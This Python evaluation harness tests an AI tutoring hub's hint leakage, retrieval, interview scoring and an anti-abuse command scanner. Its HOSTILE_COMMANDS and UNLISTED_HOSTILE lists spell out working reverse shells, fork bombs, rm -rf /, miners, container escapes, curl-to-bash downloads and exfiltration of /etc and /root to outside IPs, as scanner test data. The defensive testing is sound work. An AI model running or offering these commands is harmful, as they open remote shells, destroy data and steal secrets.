"""
Evaluation harness for the AI hub.

Measures, on the real course content:

  leak        - do tier 1-2 hints ever contain a full solution command, and
                does any hint contain the verification command? (all steps)
  cases       - hand-written stuck-student situations with expected behaviour
  retrieval   - labelled questions: is the right unit / section retrieved?
  scanner     - rule recall on hostile commands, false positives on course
                commands, and how the anomaly model does on held-out data
  interview   - does the scorer separate a model answer from an empty one?
  latency     - time per uncached hint (rule-based path)

Usage:
  python evals/run_eval.py            print the report, write evals/report.json
  python evals/run_eval.py --check    also exit 1 if a quality gate fails (CI)

Everything here runs the rule-based mentor. The LLM path is exercised by the
unit tests with a stub client; it has not been scored against a live model.
"""

import base64
import json
import statistics
import sys
import time
from pathlib import Path

HUB_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(HUB_DIR))

import numpy as np  # noqa: E402
from sklearn.ensemble import IsolationForest  # noqa: E402
from sklearn.model_selection import KFold  # noqa: E402

from agents.abuse_scanner import AntiAbuseScanner, extract_features, load_benign_commands  # noqa: E402
from agents.doc_retriever import retriever  # noqa: E402
from agents.interview_scorer import scorer  # noqa: E402
from agents.mentor import AIMentor, leaks  # noqa: E402
from agents.text import backticked  # noqa: E402
from pipeline import TTLCache, run_agent_pipeline  # noqa: E402

UNITS_DIR = HUB_DIR.parent / "server" / "data" / "units"
EVALS_DIR = HUB_DIR / "evals"

GATES = {
    "leak_rate_max": 0.0,
    "case_pass_rate_min": 0.9,
    "retrieval_unit_hit3_min": 0.85,
    "scanner_rule_recall_min": 0.95,
    "scanner_course_false_positives_max": 0,
    "interview_separation_min": 40,
}

HOSTILE_COMMANDS = [
    ":(){ :|:& };:",
    ":() { : | : & } ; :",
    "b(){ b|b& };b",
    "rm -rf /",
    "rm -rf /*",
    "sudo rm -rf --no-preserve-root /",
    "rm -fr / ",
    "dd if=/dev/zero of=/home/student/big",
    "dd if=/dev/urandom of=/tmp/x bs=1M",
    "./xmrig --url pool.minexmr.com:4444",
    "wget http://x/minerd && ./minerd -o stratum+tcp://pool:3333",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "exec 5<>/dev/tcp/evil.example/443",
    "nc -e /bin/sh 10.0.0.1 4444",
    "ncat 10.0.0.1 4444 -e /bin/bash",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
    "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
    "docker -H unix:///var/run/docker.sock run -v /:/host alpine",
    "nsenter --target 1 --mount --uts --ipc --net --pid",
    "mount -t proc proc /mnt/proc",
    "mount -t cgroup -o rdma cgroup /tmp/cg",
    "echo c > /proc/sysrq-trigger",
    "echo 1 > /sys/fs/cgroup/rdma/x/notify_on_release",
]

# Hostile payloads that no rule names directly: only the anomaly model can notice these.
UNLISTED_HOSTILE = [
    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'",
    "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");exec(\"/bin/sh -i\");'",
    "while true; do cat /dev/urandom > /dev/null & done",
    "curl -s http://198.51.100.7/a.sh | bash -s -- --quiet --persist",
    "for i in $(seq 1 100000); do (sleep 1000 &) ; done",
    "eval $(echo aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQnKQ== | base64 -d | python3)",
    "cat /proc/1/environ | tr '\\0' '\\n' | grep -i secret",
    "find / -perm -4000 -type f 2>/dev/null | xargs ls -la",
    "tar cf - /etc /root 2>/dev/null | curl -X POST --data-binary @- http://198.51.100.7/up",
    "busybox wget -qO- http://198.51.100.7/x | busybox sh",
]


def load_steps():
    """Every lab step, in the shape the gateway sends to the hub."""
    steps = []
    for practice_path in sorted(UNITS_DIR.glob("*/practice.json")):
        unit = practice_path.parent.name
        for step in json.loads(practice_path.read_text()).get("steps", []):
            steps.append((unit, step["step"], {
                "title": step["title"],
                "description": step.get("description", ""),
                "tasks": step.get("tasks", []),
                "verificationCommand": (step.get("verification") or {}).get("command"),
            }))
    return steps


def tree(files):
    """['webapp/', 'webapp/a.txt'] -> telemetry file tree; None means no telemetry."""
    if files is None:
        return None
    entries = []
    for path in files:
        is_dir = path.endswith("/")
        clean = path.rstrip("/")
        entries.append({"path": clean, "type": "directory" if is_dir else "file", "name": clean.rsplit("/", 1)[-1]})
    return {"fileTree": entries, "ports": []}


def ask(query, unit, number, step, history, telemetry, tier):
    # A fresh cache each call, so every hint is actually generated.
    return run_agent_pipeline(query, unit, number, history, telemetry, step, tier,
                              mentor_agent=AIMentor(llm=None), cache=TTLCache(1, 1))


def eval_leaks(steps):
    situations = [
        ("empty sandbox", [], tree([])),
        ("no telemetry", ["ls -la"], None),
        ("some work done", ["mkdir work", "cd work", "ls"], tree(["work/"])),
    ]
    queries = ["verify keeps failing", "what is the exact command", "I'm stuck, help"]

    total, leaked = 0, []
    for unit, number, step in steps:
        for tier in (1, 2, 3):
            for label, history, telemetry in situations:
                for query in queries:
                    total += 1
                    hint = ask(query, unit, number, step, history, telemetry, tier)["hint"]
                    if leaks(hint, step, tier):
                        leaked.append({"unit": unit, "step": number, "tier": tier, "situation": label, "hint": hint})
    return {"hints_checked": total, "leaks": len(leaked), "leak_rate": len(leaked) / total, "examples": leaked[:5]}


def check_case(case, result):
    expect = case["expect"]
    failures = []

    if "blocked" in expect and bool(result.get("blocked")) != expect["blocked"]:
        failures.append(f"blocked={result.get('blocked')}")
    if result.get("blocked"):
        return failures

    hint = result["hint"]
    assessment = result["assessment"]
    if "typo" in expect:
        actual = (assessment["typo"] or {}).get("expected")
        if actual != expect["typo"]:
            failures.append(f"typo={actual!r}, wanted {expect['typo']!r}")
    if "issue" in expect and assessment["detected_issue"] != expect["issue"]:
        failures.append(f"issue={assessment['detected_issue']}, wanted {expect['issue']}")
    for text in expect.get("mentions", []):
        if text.lower() not in hint.lower():
            failures.append(f"hint does not mention {text!r}")
    for text in expect.get("not_mentions", []):
        if text.lower() in hint.lower():
            failures.append(f"hint mentions {text!r}")
    for path in expect.get("missing_includes", []):
        if path not in result["diagnostics"]["missing"]:
            failures.append(f"diagnostics do not report {path} missing")
    if expect.get("no_commands") and any(" " in snippet for snippet in backticked(hint)):
        failures.append("tier 1 hint contains a command")
    return failures


def eval_cases(steps):
    by_key = {(unit, number): step for unit, number, step in steps}
    cases = json.loads((EVALS_DIR / "hint_cases.json").read_text())
    failed = []
    for case in cases:
        step = None if case.get("no_step") else by_key.get((case["unit"], case["step"]))
        result = ask(case["query"], case["unit"], case["step"], step, case["history"], tree(case["files"]), case["tier"])
        failures = check_case(case, result)
        if step and not result.get("blocked") and leaks(result["hint"], step, case["tier"]):
            failures.append("hint leaks a solution command")
        if failures:
            failed.append({"name": case["name"], "failures": failures, "hint": result.get("hint")})
    return {"cases": len(cases), "passed": len(cases) - len(failed), "pass_rate": (len(cases) - len(failed)) / len(cases), "failed": failed}


def eval_retrieval():
    cases = json.loads((EVALS_DIR / "retrieval_cases.json").read_text())
    with_section = [c for c in cases if c.get("section")]
    counts = {"unit_hit1": 0, "unit_hit3": 0, "section_hit1": 0, "section_hit3": 0}
    misses = []
    timings = []

    for case in cases:
        started = time.perf_counter()
        # No unit hint: this is the harder, honest setting.
        results = retriever.retrieve(case["query"], top_k=3)
        timings.append((time.perf_counter() - started) * 1000)

        units = [r["unit"] for r in results]
        counts["unit_hit1"] += bool(units[:1] == [case["unit"]])
        counts["unit_hit3"] += case["unit"] in units
        if case.get("section"):
            pairs = [(r["unit"], r["section"]) for r in results]
            target = (case["unit"], case["section"])
            counts["section_hit1"] += bool(pairs[:1] == [target])
            counts["section_hit3"] += target in pairs
        if case["unit"] not in units:
            misses.append({"query": case["query"], "wanted": case["unit"], "got": units})

    return {
        "questions": len(cases),
        "corpus_chunks": len(retriever.docs),
        "unit_hit1": counts["unit_hit1"] / len(cases),
        "unit_hit3": counts["unit_hit3"] / len(cases),
        "section_hit1": counts["section_hit1"] / len(with_section),
        "section_hit3": counts["section_hit3"] / len(with_section),
        "latency_ms_p50": round(statistics.median(timings), 2),
        "latency_ms_p95": round(sorted(timings)[int(len(timings) * 0.95) - 1], 2),
        "unit_misses": misses,
    }


def eval_scanner():
    benign = load_benign_commands()
    scanner = AntiAbuseScanner(benign)

    obfuscated = [f"echo {base64.b64encode(c.encode()).decode()} | base64 -d | sh" for c in HOSTILE_COMMANDS[:8]]
    hostile = HOSTILE_COMMANDS + obfuscated
    caught = [c for c in hostile if not scanner.scan(c)["safe"]]
    false_positives = [c for c in benign if not scanner.scan(c)["safe"]]

    # Anomaly model: train on 4/5 of the course commands, test on the rest.
    features = np.array([extract_features(c) for c in benign])
    flagged_benign = 0
    for train, test in KFold(n_splits=5, shuffle=True, random_state=42).split(features):
        model = IsolationForest(n_estimators=100, contamination=0.02, random_state=42).fit(features[train])
        flagged_benign += int((model.predict(features[test]) == -1).sum())

    unlisted_flagged = [c for c in UNLISTED_HOSTILE if scanner.scan(c)["flagged"]]

    return {
        "hostile_commands": len(hostile),
        "rule_recall": len(caught) / len(hostile),
        "rule_misses": [c for c in hostile if c not in caught],
        "course_commands": len(benign),
        "course_false_positives": len(false_positives),
        "course_false_positive_examples": false_positives[:5],
        "anomaly_held_out_flag_rate": flagged_benign / len(benign),
        "anomaly_unlisted_hostile": len(UNLISTED_HOSTILE),
        "anomaly_unlisted_hostile_flagged": len(unlisted_flagged) / len(UNLISTED_HOSTILE),
    }


def eval_interview():
    off_topic = ("I am not sure about this one. I would probably search online, ask a senior colleague for help "
                 "and then try a few things until the problem goes away, then write down what I learned.")
    model_scores, off_scores, half_scores = [], [], []
    count = 0
    for prepare_path in sorted(UNITS_DIR.glob("*/prepare.json")):
        prepare = json.loads(prepare_path.read_text())
        for question in prepare.get("interviewQuestions") or prepare.get("questions") or []:
            model = question.get("modelAnswer") or question.get("answer") or ""
            points = question.get("keyPoints") or []
            if not model:
                continue
            count += 1
            model_scores.append(scorer.score(question["question"], model, points, model)["score"])
            off_scores.append(scorer.score(question["question"], off_topic, points, model)["score"])
            half = model[: len(model) // 2]
            half_scores.append(scorer.score(question["question"], half, points, model)["score"])

    return {
        "questions": count,
        "model_answer_mean": round(statistics.mean(model_scores), 1),
        "model_answer_min": min(model_scores),
        "half_answer_mean": round(statistics.mean(half_scores), 1),
        "off_topic_mean": round(statistics.mean(off_scores), 1),
        "off_topic_max": max(off_scores),
        "separation": round(statistics.mean(model_scores) - statistics.mean(off_scores), 1),
        "ordering_holds": sum(m >= h >= o for m, h, o in zip(model_scores, half_scores, off_scores)) / count,
    }


def eval_latency(steps, runs=200):
    timings = []
    telemetry = tree(["webapp/", "webapp/src/"])
    for index in range(runs):
        unit, number, step = steps[index % len(steps)]
        started = time.perf_counter()
        ask(f"verify fails on attempt {index}", unit, number, step, ["ls -la", "pwd"], telemetry, 1 + index % 3)
        timings.append((time.perf_counter() - started) * 1000)
    timings.sort()
    return {
        "runs": runs,
        "p50_ms": round(statistics.median(timings), 2),
        "p95_ms": round(timings[int(runs * 0.95) - 1], 2),
        "max_ms": round(timings[-1], 2),
    }


def gate_failures(report):
    checks = [
        (report["leak"]["leak_rate"] <= GATES["leak_rate_max"], "hints leak solution commands"),
        (report["cases"]["pass_rate"] >= GATES["case_pass_rate_min"], "stuck-student case pass rate too low"),
        (report["retrieval"]["unit_hit3"] >= GATES["retrieval_unit_hit3_min"], "retrieval unit hit@3 too low"),
        (report["scanner"]["rule_recall"] >= GATES["scanner_rule_recall_min"], "scanner misses hostile commands"),
        (report["scanner"]["course_false_positives"] <= GATES["scanner_course_false_positives_max"], "scanner blocks course commands"),
        (report["interview"]["separation"] >= GATES["interview_separation_min"], "interview scorer does not separate good from bad answers"),
    ]
    return [message for ok, message in checks if not ok]


def pct(value):
    return f"{value * 100:.1f}%"


def main():
    steps = load_steps()
    report = {
        "steps": len(steps),
        "leak": eval_leaks(steps),
        "cases": eval_cases(steps),
        "retrieval": eval_retrieval(),
        "scanner": eval_scanner(),
        "interview": eval_interview(),
        "latency": eval_latency(steps),
    }

    leak, cases, retrieval, scan, interview, latency = (report[k] for k in ("leak", "cases", "retrieval", "scanner", "interview", "latency"))
    print(f"Lab steps: {report['steps']}\n")
    print(f"Answer leakage   {leak['leaks']} leaks in {leak['hints_checked']} hints ({pct(leak['leak_rate'])})")
    print(f"Stuck students   {cases['passed']}/{cases['cases']} cases pass ({pct(cases['pass_rate'])})")
    for failure in cases["failed"]:
        print(f"   FAIL {failure['name']}: {'; '.join(failure['failures'])}")
    print(f"Retrieval        unit hit@1 {pct(retrieval['unit_hit1'])}, hit@3 {pct(retrieval['unit_hit3'])}; "
          f"section hit@1 {pct(retrieval['section_hit1'])}, hit@3 {pct(retrieval['section_hit3'])} "
          f"({retrieval['questions']} questions, {retrieval['corpus_chunks']} chunks, p50 {retrieval['latency_ms_p50']} ms)")
    for miss in retrieval["unit_misses"]:
        print(f"   MISS {miss['query']!r}: wanted {miss['wanted']}, got {miss['got']}")
    print(f"Scanner rules    recall {pct(scan['rule_recall'])} on {scan['hostile_commands']} hostile commands; "
          f"{scan['course_false_positives']} false positives on {scan['course_commands']} course commands")
    for miss in scan["rule_misses"]:
        print(f"   MISS {miss}")
    print(f"Anomaly model    flags {pct(scan['anomaly_held_out_flag_rate'])} of held-out course commands, "
          f"{pct(scan['anomaly_unlisted_hostile_flagged'])} of {scan['anomaly_unlisted_hostile']} hostile commands no rule covers")
    print(f"Interview scorer model answer {interview['model_answer_mean']} (min {interview['model_answer_min']}), "
          f"half answer {interview['half_answer_mean']}, off-topic {interview['off_topic_mean']} (max {interview['off_topic_max']}) "
          f"over {interview['questions']} questions; ordering holds for {pct(interview['ordering_holds'])}")
    print(f"Hint latency     p50 {latency['p50_ms']} ms, p95 {latency['p95_ms']} ms (rule-based, uncached, {latency['runs']} runs)")

    (EVALS_DIR / "report.json").write_text(json.dumps(report, indent=2) + "\n")

    if "--check" in sys.argv:
        failures = gate_failures(report)
        for failure in failures:
            print(f"GATE FAILED: {failure}")
        return 1 if failures else 0
    return 0


if __name__ == "__main__":
    sys.exit(main())
